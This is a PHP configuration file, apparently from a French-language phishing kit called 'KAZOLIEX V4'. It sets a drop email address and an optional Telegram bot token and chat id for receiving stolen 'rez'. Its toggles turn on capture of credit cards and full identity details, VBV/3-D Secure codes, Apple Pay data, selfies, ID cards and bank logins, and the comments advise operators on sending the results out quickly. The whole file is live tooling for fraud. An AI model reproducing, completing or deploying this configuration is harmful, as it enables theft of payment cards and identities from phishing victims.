<?php

/*
   _____ _______________________   _____________
  / ___// ____/_  __/_  __/  _/ | / / ____/ ___/
  \__ \/ __/   / /   / /  / //  |/ / / __ \__ \ 
 ___/ / /___  / /   / / _/ // /|  / /_/ /___/ / 
/____/_____/ /_/   /_/ /___/_/ |_/\____//____/  
                                                KAZOLIEX V4
*/

//===OPTIONS_SUPLEMENTAIRES==//
$inc = "off";
$applepay = "off";
$vbv = "off";
$selfie = "off"; // INDISPONIBLE 
$cni = "off";
$log_bank = "off";
//===OPTIONS_SUPLEMENTAIRES==//    

//===ENVOI_DES_REZS==//   
$boiterez = "vahmad@bulegoblog.com";
$spammername = "jksc";
$htmlrez = "off";
$ccplusfullinfos = "on"; // SI CETTE OPTION EST ACTIVEE VOUS RECEVEREZ LA CC ET LE FULL INFOS DANS LE MEME REZ

$telegram = "off"; // ENVOYER LES REZ DIRECTEMENT PAR MESSAGE (PLUS RAPIDE, FORTEMENT CONSEILLER SI VOUS UTILISEZ LE VBV)
$bot_token = "";
$chat_id = "";
//===ENVOI_DES_REZS==//  





//===OTHERS===//
 //compter le nombre d'etapes
$stepsnumber = 3;

if($applepay == "on")
{
	$stepsnumber = $stepsnumber + 1;
}

if($selfie == "off")
{
	$stepsnumber = $stepsnumber + 1;
}
if($cni == "off")
{
	$stepsnumber = $stepsnumber + 1;
}
if($log_bank == "off")
{
	$stepsnumber = $stepsnumber + 1;
}


?>